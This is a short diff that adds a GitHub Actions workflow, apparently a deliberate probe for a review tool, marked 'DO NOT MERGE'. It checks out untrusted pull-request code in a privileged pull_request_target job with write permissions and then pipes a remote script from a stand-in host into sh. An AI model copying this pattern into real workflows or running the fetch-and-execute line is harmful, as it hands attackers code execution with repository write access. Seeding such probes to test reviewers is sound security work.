@@ -1,0 +1,23 @@
+# Intentional /dcoir-review GitHub Actions probe. DO NOT MERGE.
+name: DCOIR Review Runtime Patch Probe
+
+on:
+  pull_request_target:
+
+permissions:
+  contents: write
+  pull-requests: write
+  actions: read
+
+jobs:
+  privileged-head:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR head sha in privileged workflow
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Run unverified bootstrap script
+        run: |
+          wget -qO- https://example.invalid/dcoir-bootstrap.sh | sh
